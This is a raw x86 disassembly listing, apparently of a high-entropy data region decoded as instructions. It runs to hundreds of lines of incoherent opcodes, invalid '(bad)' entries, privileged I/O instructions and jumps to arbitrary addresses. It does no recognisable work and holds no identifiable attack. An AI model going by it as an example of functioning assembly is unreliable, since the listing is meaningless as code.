  4200d7:	(bad)  [ecx]
  4200d9:	iret   
  4200da:	cld    
  4200db:	mov    esi,0xd82f02c6
  4200e0:	adc    edi,DWORD PTR [edx]
  4200e2:	in     al,0xd5
  4200e4:	lahf   
  4200e5:	test   ebp,eax
  4200e7:	ds mov ebx,0x5909f247
  4200ed:	(bad)  
  4200ee:	mov    eax,ds:0x4b48b49d
  4200f3:	dec    esi
  4200f4:	lods   eax,DWORD PTR ds:[esi]
  4200f5:	push   ebp
  4200f6:	jg     0x4200a5
  4200f8:	call   0x79377388
  4200fd:	fmulp  st(3),st
  4200ff:	popw   es
  420101:	mov    esi,0xbc6b9fcf
  420106:	scas   al,BYTE PTR es:[edi]
  420107:	inc    ebx
  420108:	sbb    ch,BYTE PTR [ecx+0x37]
  42010b:	int3   
  42010c:	lea    esi,[eax+0x16]
  42010f:	loope  0x420183
  420111:	push   eax
  420112:	jae    0x420140
  420114:	dec    edi
  420115:	xchg   edi,eax
  420116:	data16 sbb al,0x99
  420119:	cwde   
  42011a:	iret   
  42011b:	sti    
  42011c:	push   es
  42011d:	test   al,0xfe
  42011f:	into   
  420120:	mov    al,0x62
  420122:	mov    esp,0x4e181b3f
  420127:	ror    DWORD PTR [ecx],cl
  420129:	stos   DWORD PTR es:[edi],eax
  42012a:	inc    ebp
  42012b:	xchg   esi,edi
  42012d:	inc    edi
  42012e:	push   ds
  42012f:	fisubr WORD PTR [edi+0x6f]
  420132:	push   0x2f
  420134:	inc    esp
  420135:	shl    edi,cl
  420137:	mov    eax,ds:0x4df25073
  42013c:	inc    esi
  42013d:	(bad)  
  42013e:	cmc    
  42013f:	int3   
  420140:	jbe    0x4200f5
  420142:	loope  0x4200e0
  420144:	(bad)  
  420145:	sti    
  420146:	or     DWORD PTR [ebx+ecx*4],esi
  420149:	push   DWORD PTR [eax+0x729bb90e]
  42014f:	jg     0x4201cd
  420151:	xchg   edx,eax
  420152:	mov    ebp,gs
  420154:	shl    BYTE PTR [ebx-0xd],cl
  420157:	pop    ebp
  420158:	dec    eax
  420159:	das    
  42015a:	(bad)  
  42015b:	mov    dh,0x20
  42015d:	pop    ebx
  42015e:	push   0x8cd2fd63
  420163:	mov    edx,0xf7c53c04
  420168:	push   ds
  420169:	shl    BYTE PTR [edi+0x328b4d8c],0x16
  420170:	push   cs
  420171:	inc    edi
  420172:	loope  0x4201e7
  420174:	jns    0x420154
  420176:	mov    ebx,0x38163913
  42017b:	xchg   edx,eax
  42017c:	pop    ds
  42017d:	fsub   DWORD PTR ds:[ebp-0xdc50b14]
  420184:	jnp    0x4201a4
  420186:	pushf  
  420187:	bound  esp,QWORD PTR [esi+0x23ed2e2d]
  42018d:	inc    esi
  42018e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42018f:	loop   0x4201c5
  420191:	jle    0x4201ad
  420193:	fld    TBYTE PTR [ebp+eiz*2-0x13b109ff]
  42019a:	mov    cl,0x55
  42019c:	jnp    0x420198
  42019e:	lods   eax,DWORD PTR gs:[esi]
  4201a0:	inc    ebp
  4201a1:	sar    BYTE PTR [ecx-0x6b],0x3b
  4201a5:	mov    BYTE PTR [edi+0xc0693e8],bh
  4201ab:	dec    ebp
  4201ac:	(bad)  
  4201ad:	push   ss
  4201ae:	dec    esi
  4201af:	stc    
  4201b0:	call   0x960b:0xd271609b
  4201b7:	cmp    ah,dl
  4201b9:	test   eax,0x4d48bf41
  4201be:	ja     0x420143
  4201c0:	das    
  4201c1:	and    BYTE PTR [edi],0x5c
  4201c4:	xchg   esp,eax
  4201c5:	mov    gs,ebx
  4201c7:	pop    esi
  4201c8:	clc    
  4201c9:	mov    bl,0xb4
  4201cb:	out    dx,al
  4201cc:	cmp    al,BYTE PTR [ebx+0x6bb55904]
  4201d2:	pop    ecx
  4201d3:	fs and al,0xb5
  4201d6:	cmp    esp,edi
  4201d8:	sub    BYTE PTR [edi+0x3e74b672],bl
  4201de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201df:	pop    ss
  4201e0:	add    al,0x95
  4201e2:	lods   eax,DWORD PTR ds:[esi]
  4201e3:	pop    eax
  4201e4:	adc    bh,dl
  4201e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201e7:	push   ebp
  4201e8:	mov    eax,ds:0x88709b74
  4201ed:	push   0x89cdfab7
  4201f2:	cmp    ch,bl
  4201f4:	push   ebp
  4201f5:	or     BYTE PTR [eax+edi*4-0x70],bh
  4201f9:	xchg   edx,eax
  4201fa:	into   
  4201fb:	repnz mov dl,0x8d
  4201fe:	jg     0x42019a
  420200:	in     eax,dx
  420201:	xor    al,0xa8
  420203:	add    eax,0xdd93ea7a
  420208:	lock push cs
  42020a:	mov    bh,0x7f
  42020c:	jmp    FWORD PTR [eax+edi*4-0x35]
  420210:	add    esi,DWORD PTR [ecx+edx*8+0x56]
  420214:	inc    ebx
  420215:	mov    DWORD PTR [eax+0x3c],esp
  420218:	fidivr DWORD PTR [esi]
  42021a:	jns    0x4201ea
  42021c:	mov    ebx,0xb719a367
  420221:	xchg   esp,eax
  420222:	hlt    
  420223:	mov    dh,0x66
  420225:	fist   DWORD PTR [esi-0x20]
  420228:	inc    ebx
  420229:	push   0x8c909503
  42022e:	fidivr WORD PTR [edi]
  420230:	test   eax,0x9e558e7d
  420235:	push   es
  420236:	popf   
  420237:	xlat   BYTE PTR ds:[ebx]
  420238:	pop    esi
  420239:	aaa    
  42023a:	mov    esi,0x4b01123b
  42023f:	and    al,0xe8
  420241:	dec    edx
  420242:	add    cl,BYTE PTR [ecx+0x50d221aa]
  420248:	retf   
  420249:	cli    
  42024a:	inc    edx
  42024b:	fadd   DWORD PTR [ebp-0x668b2085]
  420251:	sar    DWORD PTR [edi],0x7b
  420254:	loop   0x420260
  420256:	bound  di,DWORD PTR [ecx+0x28136b9f]
  42025d:	mov    ebx,0x2696d426
  420262:	int3   
  420263:	jmp    0x7b2af9f8
  420268:	into   
  420269:	loopne 0x420254
  42026b:	retf   0x3ee
  42026e:	call   0x82894bbb
  420273:	test   al,0x58
  420275:	xchg   ecx,eax
  420276:	dec    ebx
  420277:	stc    
  420278:	sahf   
  420279:	dec    edx
  42027a:	imul   eax,DWORD PTR [esp+ebp*8],0x540fe8f
  420281:	jnp    0x4202df
  420283:	pop    ds
  420284:	jg     0x420207
  420286:	clc    
  420287:	xchg   edx,eax
  420288:	cld    
  420289:	xchg   edi,eax
  42028a:	cmp    al,0xa4
  42028c:	popf   
  42028d:	or     edx,DWORD PTR [edi]
  42028f:	in     eax,dx
  420290:	repz inc edi
  420292:	cld    
  420293:	push   ebp
  420294:	jp     0x42024c
  420296:	xchg   DWORD PTR [ebx-0x66691e84],esi
  42029c:	ret    0xc71d
  42029f:	arpl   ax,di
  4202a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202a2:	mov    al,ds:0x75e77f51
  4202a7:	mov    cl,0x8c
  4202a9:	xchg   BYTE PTR [ebx],dh
  4202ab:	push   es
  4202ac:	imul   eax,DWORD PTR [edi+0x37],0xe57488ea
  4202b3:	data16 jmp 0x4202bb
  4202b6:	loopne 0x4202d7
  4202b8:	mov    eax,0x12d4ee2
  4202bd:	mov    ch,BYTE PTR [edx+0x688bd317]
  4202c3:	cmp    ah,cl
  4202c5:	mov    ?,WORD PTR [ebp-0x18790b2e]
  4202cb:	imul   edx,DWORD PTR [esi],0x4
  4202ce:	add    al,ch
  4202d0:	aaa    
  4202d1:	sahf   
  4202d2:	dec    edi
  4202d3:	push   0xe
  4202d5:	js     0x4202e9
  4202d7:	mov    ch,BYTE PTR ds:0xc3d06894
  4202dd:	rol    DWORD PTR [edi+0x63cc8ad7],0xa2
  4202e4:	pop    ebx
  4202e5:	out    dx,al
  4202e6:	stos   DWORD PTR es:[edi],eax
  4202e7:	jno    0x420285
  4202e9:	adc    BYTE PTR [eax+0x57],al
  4202ec:	and    cl,0xe1
  4202ef:	pop    esp
  4202f0:	loope  0x42033b
  4202f2:	repz mov bh,BYTE PTR es:0x7b9c8df3
  4202fa:	pusha  
  4202fb:	mov    ds:0x19292105,eax
  420300:	push   esi
  420301:	jns    0x4202c8
  420303:	sbb    al,0x7a
  420305:	push   eax
  420306:	push   esp
  420307:	adc    eax,0xafe8e78b
  42030c:	hlt    
  42030d:	xor    al,0xe
  42030f:	pop    esp
  420310:	bnd jl 0x420293
  420313:	inc    ecx
  420314:	rcl    DWORD PTR [ecx+edx*8],cl
  420317:	mov    eax,0x8a583a58
  42031c:	repnz xlat BYTE PTR ds:[ebx]
  42031e:	call   0xee20e044
  420323:	call   0x5ffab6cc
  420328:	mov    edx,0xd0cbd39c
  42032d:	mov    al,0x1d
  42032f:	stos   BYTE PTR es:[edi],al
  420330:	sub    BYTE PTR [ebx-0x1c4af63a],bh
  420336:	xor    DWORD PTR [edi],edi
  420338:	cld    
  420339:	inc    esi
  42033a:	inc    eax
  42033b:	sbb    DWORD PTR [ebx+0x7b],0x4c
  42033f:	fstp   QWORD PTR [ebp+ecx*8-0x5f9548e4]
  420346:	push   ebx
  420347:	leave  
  420348:	fdiv   QWORD PTR [edx+0x584f8eb3]
  42034e:	xor    ah,BYTE PTR [ecx+ebp*4]
  420351:	loopne 0x4203c2
  420353:	cwde   
  420354:	xchg   ebx,eax
  420355:	xchg   ebx,eax
  420356:	mov    ds:0xee2ab07d,eax
  42035b:	add    DWORD PTR [ecx],esp
  42035d:	sub    BYTE PTR [ebx],dh
  42035f:	or     al,0x63
  420361:	sti    
  420362:	das    
  420363:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420364:	cmp    edx,edi
  420366:	pop    es
  420367:	inc    edi
  420368:	cmp    ch,BYTE PTR [eax+0x45]
  42036b:	add    eax,0x3c51a1f8
  420370:	xchg   edi,eax
  420371:	(bad)  
  420373:	adc    ebx,DWORD PTR [eax]
  420375:	add    al,0xb8
  420377:	pushf  
  420378:	dec    esi
  420379:	and    DWORD PTR [edi],ebx
  42037b:	mov    esi,0x5023521c
  420380:	adc    BYTE PTR [esi],bh
  420382:	sbb    BYTE PTR [esp+eax*8],ah
  420385:	outs   dx,BYTE PTR ds:[esi]
  420386:	retf   0x2276
  420389:	push   esp
  42038a:	out    0x79,al
  42038c:	adc    edx,DWORD PTR [ecx-0x192b2468]
  420392:	lea    edi,[ecx]
  420394:	xor    al,0x52
  420396:	loop   0x420414
  420398:	test   al,0x8b
  42039a:	push   esp
  42039b:	adc    eax,0x4e1bb61d
  4203a0:	cmc    
  4203a1:	jns    0x4203c0
  4203a3:	cmp    edi,DWORD PTR cs:[esi+0x72]
  4203a7:	dec    ebx
  4203a8:	and    al,0x79
  4203aa:	and    al,0x1c
  4203ac:	mov    al,0xa7
  4203ae:	jnp    0x420401
  4203b0:	mov    ss,WORD PTR [ebx-0x2c5c4404]
  4203b6:	xchg   edx,eax
  4203b7:	enter  0x80f0,0xb8
  4203bb:	adc    al,0x67
  4203bd:	scas   al,BYTE PTR es:[edi]
  4203be:	adc    edi,ebx
  4203c0:	(bad)  [ebp-0x680190a9]
  4203c6:	(bad)  
  4203c7:	mov    edx,0xc8122555
  4203cc:	sbb    BYTE PTR ds:0xe9c20a01,ah
  4203d2:	pop    eax
  4203d3:	pop    ecx
  4203d4:	aas    
  4203d5:	sbb    BYTE PTR [ebp+0x22],0x3e
  4203d9:	lods   eax,DWORD PTR ds:[esi]
  4203da:	jp     0x4203a5
  4203dc:	cld    
  4203dd:	mov    DWORD PTR [esi+0x10206267],esi
  4203e3:	push   cs
  4203e4:	xor    BYTE PTR [ecx+edx*4-0x3d],bl
  4203e8:	jge    0x4203f2
  4203ea:	fidivr DWORD PTR [ebp+0x5225e82]
  4203f0:	sub    al,0xc9
  4203f2:	iret   
  4203f3:	xor    eax,0x4cb9ef5e
  4203f8:	repz shl BYTE PTR [edi],0x50
  4203fc:	pop    ss
  4203fd:	icebp  
  4203fe:	push   ax
  420400:	cmp    bh,BYTE PTR [ebp+edx*4-0x56d9a7f3]
  420407:	xor    esp,DWORD PTR [edi]
  420409:	cmp    ch,cl
  42040b:	outs   dx,BYTE PTR ds:[esi]
  42040c:	and    eax,0x2cb2c076
  420411:	fisub  WORD PTR [ecx-0x53cd88ca]
  420417:	and    eax,DWORD PTR [ebp-0x23cb5715]
  42041d:	and    ebp,ebx
  42041f:	cmp    al,0x9e
  420421:	lods   al,BYTE PTR ds:[esi]
  420422:	icebp  
  420423:	and    DWORD PTR [esi+ebx*1],0xffffffa9
  420427:	mov    cl,0x4e
  420429:	pmaxub mm2,QWORD PTR [edx+0x36]
  42042d:	imul   edi,edx,0x6ec24d6b
  420433:	mov    eax,0x706ab8f0
  420439:	add    esi,DWORD PTR [edx+0x1e]
  42043c:	and    ebx,DWORD PTR [ecx-0x7]
  42043f:	aam    0x5b
  420441:	fiadd  DWORD PTR [ebx-0x3a]
  420444:	fdiv   DWORD PTR [ebp+0x39]
  420447:	pop    ecx
  420448:	je     0x4204ad
  42044a:	fist   DWORD PTR [eax+0xe]
  42044d:	mov    edi,0x6981904b
  420452:	cs loope 0x420463
  420455:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420456:	push   ebx
  420457:	mov    ah,bh
  420459:	jp     0x420454
  42045b:	mov    eax,ebp
  42045d:	pop    eax
  42045e:	test   BYTE PTR [ebp+ecx*8+0x3e],0x10
  420463:	lods   al,BYTE PTR ds:[esi]
  420464:	repz sbb ebx,edi
  420467:	push   esi
  420468:	fdiv   DWORD PTR [esi-0x1c]
  42046b:	xchg   ebx,eax
  42046c:	wbinvd 
  42046e:	xchg   al,dl
  420470:	repz mov ecx,0x9b9b96a
  420476:	push   cs
  420477:	mov    dh,0xd5
  420479:	mov    DWORD PTR [ebp-0x39a9f199],ebp
  42047f:	mov    ds:0xe4fac3fc,al
  420484:	leave  
  420485:	jge    0x420506
  420487:	out    dx,eax
  420488:	sub    al,0x15
  42048a:	aas    
  42048b:	inc    ecx
  42048c:	or     eax,0xeb44f813
  420491:	retf   
  420492:	ret    
  420493:	mov    edx,0xfe5d3ec1
  420498:	fst    st(7)
  42049a:	cmp    ecx,edx
  42049c:	loope  0x4204fc
  42049e:	into   
  42049f:	cmp    eax,0xf6cbf1d1
  4204a4:	mov    ds:0x2004aff9,eax
  4204a9:	push   eax
  4204aa:	add    bl,ah
  4204ac:	jl     0x4204e0
  4204ae:	fucom  st(5)
  4204b0:	repz out 0xfb,eax
  4204b3:	lock in eax,0x17
  4204b6:	in     eax,dx
  4204b7:	pop    ds
  4204b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204b9:	ret    
  4204ba:	add    al,0x3c
  4204bc:	aas    
  4204bd:	inc    edx
  4204be:	shl    DWORD PTR [edi+ebx*2],cl
  4204c1:	fnstsw WORD PTR [esi+0x2891767a]
  4204c7:	cli    
  4204c8:	xor    DWORD PTR [esi+edi*8],ebx
  4204cb:	outs   dx,DWORD PTR ds:[esi]
  4204cc:	add    eax,0x1bd07fb3
  4204d1:	nop
  4204d2:	pushf  
  4204d3:	pop    ecx
  4204d4:	(bad)  
  4204d5:	xlat   BYTE PTR ds:[ebx]
  4204d6:	jno    0x420464
  4204d8:	xor    BYTE PTR [esi],ch
  4204da:	imul   ebx,esi,0xffffff97
  4204dd:	loope  0x420499
  4204df:	pop    eax
  4204e0:	push   esi
  4204e1:	sbb    ecx,DWORD PTR [eax+edx*2-0x79]
  4204e5:	fimul  DWORD PTR [edx-0x3f]
  4204e8:	push   ebp
  4204e9:	pop    es
  4204ea:	mov    edx,0x26d3d6c8
  4204ef:	xor    BYTE PTR [esi+0x36],dl
  4204f2:	or     al,0xdd
  4204f4:	(bad)  
  4204f5:	and    dl,BYTE PTR [ebp+0x3e]
  4204f8:	test   BYTE PTR [edx-0x3f],0x5
  4204fc:	mov    eax,0xd9db11dc
  420501:	sbb    BYTE PTR [ebx+0x10],cl
  420504:	leave  
  420505:	push   edx
  420506:	push   cs
  420507:	pop    esi
  420508:	in     eax,0x62
  42050a:	mov    eax,ds:0xaee78b79
  42050f:	or     BYTE PTR ds:0x413fb308,0x86
  420516:	cwde   
  420517:	fcomp  QWORD PTR ds:0x3a8ffb4b
  42051d:	dec    ecx
  42051e:	pop    es
  42051f:	cdq    
  420520:	pop    ecx
  420521:	mov    edi,DWORD PTR [eax]
  420523:	retf   0x816c
  420526:	ins    BYTE PTR es:[edi],dx
  420527:	in     eax,dx
  420528:	pop    ds
  420529:	jle    0x4204cf
  42052b:	imul   ecx,DWORD PTR [eax-0x49eaa95a],0x46253124
  420535:	ror    DWORD PTR [ebp-0x2d],cl
  420538:	push   edi
  420539:	pusha  
  42053a:	icebp  
  42053b:	fs sub eax,0xf1663d8f
  420541:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420542:	or     eax,0x1f9dbeea
  420547:	rep stos BYTE PTR es:[edi],al
  420549:	mov    eax,0xb06eee
  42054e:	cld    
  42054f:	scas   al,BYTE PTR es:[edi]
  420550:	push   ebx
  420551:	int3   
  420552:	cwde   
  420553:	sub    BYTE PTR [ecx-0x50],dh
  420556:	pop    edi
  420557:	loop   0x4204ec
  420559:	jmp    0x3dd1:0x7454dfd1
  420560:	ror    cl,1
  420562:	push   ebx
  420563:	jecxz  0x4205d7
  420565:	pusha  
  420566:	add    eax,0xd28168fe
  42056b:	imul   dh
  42056d:	add    esp,DWORD PTR [eax+0xf84dfce]
  420573:	xchg   ecx,eax
  420574:	mov    eax,0xc5808a11
  420579:	push   ds
  42057a:	faddp  st(0),st
  42057c:	aas    
  42057d:	pop    ecx
  42057e:	stc    
  42057f:	jp     0x4205aa
  420581:	jns    0x42058a
  420583:	enter  0x5f16,0x4f
  420587:	sub    al,0x57
  420589:	daa    
  42058a:	mov    ebp,0xeb6f85e6
  42058f:	int3   
  420590:	fadd   DWORD PTR [ecx]
  420592:	sub    eax,0x99bcc299
  420597:	sbb    eax,0xb23639cb
  42059c:	jecxz  0x420609
  42059e:	or     esp,ebp
  4205a0:	aad    0xa5
  4205a2:	pop    ds
  4205a3:	jmp    0x4205d4
  4205a5:	mov    esi,0x420e2139
  4205aa:	clc    
  4205ab:	ret    0xaa61
  4205ae:	xor    eax,0x8403fdf3
  4205b3:	outs   dx,DWORD PTR ds:[esi]
  4205b4:	pop    edi
  4205b5:	jbe    0x420558
  4205b7:	cmp    ah,BYTE PTR [edi]
  4205b9:	mov    dl,BYTE PTR [edi]
  4205bb:	sbb    ecx,DWORD PTR [edx+eax*8]
  4205be:	push   cs
  4205bf:	xor    dh,dh
  4205c1:	popf   
  4205c2:	in     eax,dx
  4205c3:	jae    0x42057c
  4205c5:	push   ss
  4205c6:	sbb    edi,DWORD PTR [edx]
  4205c8:	lea    eax,[edx+0x14b8aec9]
  4205ce:	add    al,0x57
  4205d0:	scas   eax,DWORD PTR es:[edi]
  4205d1:	(bad)  
  4205d2:	cld    
  4205d3:	stos   DWORD PTR es:[edi],eax
  4205d4:	lods   al,BYTE PTR ds:[esi]
  4205d5:	(bad)  [esi+0x59]
  4205d8:	xor    al,0xd6
  4205da:	(bad)  
  4205dd:	xlat   BYTE PTR ss:[ebx]
  4205df:	imul   ebp,DWORD PTR [esi+0x44],0x1d
  4205e3:	push   esp
  4205e4:	in     eax,dx
  4205e5:	(bad)  
  4205e6:	mov    al,ds:0x35d7125b
  4205eb:	gs sti 
  4205ed:	mov    ah,0xf7
  4205ef:	and    eax,0x115f2974
  4205f4:	push   ebp
  4205f5:	mov    edi,0x7b576a5
  4205fa:	fild   DWORD PTR ds:0x1831883b
  420600:	lds    ebp,FWORD PTR [esi-0x1f]
  420603:	push   0xf81ca54d
  420608:	jns    0x420614
  42060a:	inc    esp
  42060b:	xor    cl,BYTE PTR [edx-0x24351278]
  420611:	loope  0x420625
  420613:	addr16 pop ecx
  420615:	lods   eax,DWORD PTR ss:[esi]
  420617:	pop    es
  420618:	imul   ebp,DWORD PTR [eax+edi*2],0xfeebdfab
  42061f:	vmulss xmm0,xmm3,DWORD PTR es:[ecx+0x36]
  420625:	mov    eax,ds:0x64c44a92
  42062a:	repnz iret 
  42062c:	add    DWORD PTR ds:0xa7b88ee1,esi
  420632:	gs push esp
  420634:	int    0x89
  420636:	cli    
  420637:	or     BYTE PTR [eax-0x5c185552],bl
  42063d:	popf   
  42063e:	jl     0x4205f8
  420640:	pop    ss
  420641:	out    0x4,eax
  420643:	or     ah,dl
  420645:	pop    es
  420646:	xchg   cx,ax
  420648:	les    edx,FWORD PTR [ebp+eiz*4+0x6fff7d8d]
  42064f:	dec    ecx
  420650:	sub    eax,0xb58a601c
  420655:	or     BYTE PTR [edi],bl
  420657:	pop    eax
  420658:	add    esi,DWORD PTR [ebx+ecx*4-0x18]
  42065c:	inc    edi
  42065d:	std    
  42065e:	mov    ?,WORD PTR [edx+0x4fbb0b5a]
  420664:	in     eax,0x6a
  420666:	rcl    bh,cl
  420668:	fild   DWORD PTR [ecx-0x36]
  42066b:	mov    edx,0x2422431e
  420670:	cmc    
  420671:	mov    WORD PTR ds:0x97dc637f,ss
  420677:	sbb    DWORD PTR [edi-0x5a],edi
  42067a:	xchg   esi,eax
  42067b:	cmc    
  42067c:	adc    ebp,DWORD PTR [edx-0x5e]
  42067f:	loop   0x42066f
  420681:	retf   0xe618
  420684:	pop    edx
  420685:	mov    esp,0x2e31bc74
  42068a:	xlat   BYTE PTR ds:[ebx]
  42068b:	iret   
  42068c:	mov    esi,DWORD PTR [ebx]
  42068e:	jg     0x420686
  420690:	les    ebx,FWORD PTR [eax]
  420692:	nop
  420693:	dec    edi
  420694:	push   ebx
  420695:	fwait
  420696:	jmp    0x42064f
  420698:	mov    ecx,0xf8dca308
  42069d:	dec    ebp
  42069e:	or     eax,0xe625af52
  4206a3:	int3   
  4206a4:	dec    ebp
  4206a5:	mov    dl,0x5f
  4206a7:	push   ecx
  4206a8:	or     eax,0x239d72a
  4206ad:	sub    esp,DWORD PTR [edx+0x22]
  4206b0:	or     eax,0xfd83674b
  4206b5:	add    DWORD PTR [eax],ecx
  4206b7:	sub    al,0xd5
  4206b9:	js     0x4206d4
  4206bb:	xchg   edi,eax
  4206bc:	pusha  
  4206bd:	push   0xffffffc6
  4206bf:	adc    esi,ecx
  4206c1:	jmp    0xa5eb5602
  4206c6:	jp     0x4206e2
  4206c8:	shl    DWORD PTR [ebp+0x5bdf85a4],cl
  4206ce:	aad    0xed
  4206d0:	frstor [edx+0x9acc203]
  4206d6:	or     eax,0xd7980ad5
  4206db:	scas   al,BYTE PTR es:[edi]
  4206dc:	adc    ch,BYTE PTR [ecx+0x15]
  4206df:	xor    al,BYTE PTR [ebx-0x6d]
  4206e2:	cmp    cl,BYTE PTR [eax]
  4206e4:	sub    eax,0x84260f6a
  4206e9:	(bad)  
  4206ea:	pop    edi
  4206eb:	dec    esi
  4206ec:	pop    ss
  4206ed:	xor    BYTE PTR [ebx-0x34],bh
  4206f0:	test   dh,dh
  4206f2:	retf   
  4206f3:	in     eax,0xcb
  4206f5:	daa    
  4206f6:	call   0x2e32:0xa6b0f66f
  4206fd:	imul   edx,DWORD PTR es:[edx-0x4dae7724],0x30
  420705:	and    ah,BYTE PTR [edx-0x23]
  420708:	mov    ds:0x2e7b6992,al
  42070d:	arpl   WORD PTR ds:0x894f4b2d,bp
  420713:	sar    DWORD PTR [esi+0x35dc6066],cl
  420719:	mov    ah,0xef
  42071c:	call   0xc64e:0xb8124310
  420723:	call   0x91c0:0x4f25c159
  42072a:	repz imul cl
  42072d:	popf   
  42072e:	mov    bh,BYTE PTR [edx-0x2b7cd70f]
  420734:	out    0xbc,al
  420736:	sub    eax,0xfa9cc32
  42073b:	mov    dl,0x67
  42073d:	dec    eax
  42073e:	aam    0xd6
  420740:	push   cs
  420741:	sub    DWORD PTR [edx-0x1d0e5db0],0x4a
  420748:	int    0x3c
  42074a:	ss loope 0x420766
  42074d:	sti    
  42074e:	shr    DWORD PTR [ecx],1
  420750:	mov    dl,0x21
  420752:	add    al,0xf3
  420754:	pushf  
  420755:	push   cs
  420756:	add    eax,0x2ce8282f
  42075b:	xchg   DWORD PTR [eax],eax
  42075d:	xor    DWORD PTR [ebp-0x14],esi
  420760:	pop    esi
  420761:	jle    0x42071d
  420763:	mov    BYTE PTR [eax+0x72],bh
  420766:	and    eax,0xec3fc186
  42076b:	sbb    al,0xec
  42076d:	out    0x9,al
  42076f:	icebp  
  420770:	and    al,0x64
  420772:	hlt    
  420773:	or     DWORD PTR [edi-0x6f59f80c],eax
  420779:	inc    ebp
  42077a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42077b:	fwait
  42077c:	sub    ch,bh
  42077e:	mov    eax,ds:0xf6ad059e
  420783:	mov    BYTE PTR [esi],dl
  420785:	fwait
  420786:	call   0xc54e438c
  42078b:	inc    ebp
  42078c:	dec    eax
  42078d:	mov    DWORD PTR [edx+0x7c],ecx
  420790:	(bad)  
  420791:	mov    ss:0x5d0e9818,al
  420797:	xor    BYTE PTR [ebp+ebp*8-0x26],0x9
  42079c:	cld    
  42079d:	popf   
  42079e:	data16 mov bl,0xe
  4207a1:	push   edx
  4207a2:	daa    
  4207a3:	push   edx
  4207a4:	call   0x966d:0x646f73a2
  4207ab:	les    ecx,FWORD PTR [edx+ebp*8-0x6ec9da9c]
  4207b2:	sahf   
  4207b3:	cmp    BYTE PTR [ecx],0xe7
  4207b6:	add    esi,ecx
  4207b8:	xchg   DWORD PTR [ecx-0x1b],esp
  4207bb:	mov    dl,0xc3
  4207bd:	pusha  
  4207be:	cmp    DWORD PTR [ebp+0xa],edi
  4207c1:	rol    DWORD PTR [ecx],1
  4207c3:	sbb    esp,DWORD PTR [edx+0x76128cca]
  4207c9:	pushf  
  4207ca:	es mov dl,0x36
  4207cd:	pusha  
  4207ce:	xor    eax,0x47670343
  4207d3:	push   esp
  4207d4:	stc    
  4207d5:	adc    al,0xc7
  4207d7:	inc    esp
  4207d8:	xlat   BYTE PTR ds:[ebx]
  4207d9:	lock (bad) 
  4207db:	and    eax,DWORD PTR [esi-0x69]
  4207de:	ficomp DWORD PTR [ecx+0x79]
  4207e1:	add    ch,ah
  4207e3:	add    BYTE PTR [eax],0x3c
  4207e6:	sti    
  4207e7:	ins    BYTE PTR es:[edi],dx
  4207e8:	lds    edx,FWORD PTR [esi+eiz*4-0xcde6f7f]
  4207ef:	add    dh,bh
  4207f1:	jmp    0x19d6:0x5e1e22bb
  4207f8:	loopne 0x420873
  4207fa:	test   eax,0xf477f7f1
  4207ff:	xor    eax,0x69578891
  420804:	lods   al,BYTE PTR ds:[esi]
  420805:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420806:	call   0x94c3b324
  42080b:	das    
  42080c:	add    DWORD PTR [edi+0x79],esp
  42080f:	adc    bl,ah
  420811:	or     dh,dl
  420813:	mov    ecx,0x5ed7cad1
  420818:	sbb    DWORD PTR [ebp+0x36],ebp
  42081b:	addr16 sub dh,0xb2
  42081f:	inc    ecx
  420820:	pop    ss
  420821:	jbe    0x4207c2
  420823:	jmp    0x4207e6
  420825:	dec    ecx
  420826:	mov    edx,0xa0ee3e61
  42082b:	mov    dl,0x41
  42082d:	daa    
  42082e:	and    DWORD PTR [esp+ebx*8+0x4a],0xffffffb9
  420833:	xor    edi,DWORD PTR [esi+0x56]
  420836:	scas   eax,DWORD PTR es:[edi]
  420837:	cmp    edx,edi
  420839:	aas    
  42083a:	mov    cl,BYTE PTR ds:0x201c607
  420840:	in     al,0x6b
  420842:	jmp    0xb93bcfa2
  420847:	ret    
  420848:	xchg   ebx,eax
  42084a:	retf   
  42084b:	inc    eax
  42084c:	mov    ebp,0x60138a86
  420851:	out    0x88,eax
  420853:	mov    bh,0xf2
  420855:	or     al,0xa0
  420857:	push   0xe
  420859:	lahf   
  42085a:	xchg   edi,eax
  42085b:	cmp    eax,0x7ee5969c
  420860:	xchg   edx,eax
  420861:	or     ebx,DWORD PTR [ecx-0x35d32f5c]
  420867:	mov    ebp,0xb95659b
  42086c:	jg     0x42089e
  42086e:	out    dx,eax
  42086f:	(bad)  
  420870:	jge    0x4208e3
  420872:	cmp    bh,cl
  420874:	jle    0x4208dc
  420876:	or     dl,BYTE PTR ds:0xd142d394
  42087c:	int3   
  42087d:	push   edi
  42087e:	call   0x1139a5d6
  420883:	fadd   DWORD PTR [edi+0x65078a67]
  420889:	dec    edx
  42088a:	or     eax,0x5d252ac4
  42088f:	cmp    eax,0xd840bb89
  420894:	inc    DWORD PTR [edx-0x2b]
  420897:	lods   al,BYTE PTR ds:[esi]
  420898:	repnz mov ecx,0xbb9d028f
  42089e:	push   es
  42089f:	inc    esp
  4208a0:	(bad)  
  4208a1:	fsubr  QWORD PTR [edi-0x7556b171]
  4208a7:	stc    
  4208a8:	ss loope 0x4208fc
  4208ab:	vpmuludq ymm1,ymm2,YMMWORD PTR [ecx]
  4208af:	stos   BYTE PTR es:[edi],al
  4208b0:	cmp    DWORD PTR [ebx+0x21],edx
  4208b3:	jecxz  0x420910
  4208b5:	cs out dx,eax
  4208b7:	push   cs
  4208b8:	mov    ds:0x5b01e73a,eax
  4208bd:	sub    bh,bl
  4208bf:	inc    esp
  4208c0:	loop   0x420851
  4208c2:	sub    ch,BYTE PTR [esi-0x456976fc]
  4208c8:	shl    DWORD PTR [ecx+0x16ade975],1
  4208ce:	push   esi
  4208cf:	cmp    dl,BYTE PTR [ebp-0x6971545a]
  4208d5:	shl    BYTE PTR [ecx-0x70],cl
  4208d8:	pop    ebp
  4208d9:	or     BYTE PTR [edx+0x3c],dh
  4208dc:	stos   BYTE PTR es:[edi],al
  4208dd:	xchg   ecx,eax
  4208de:	xchg   edi,eax
  4208df:	push   es
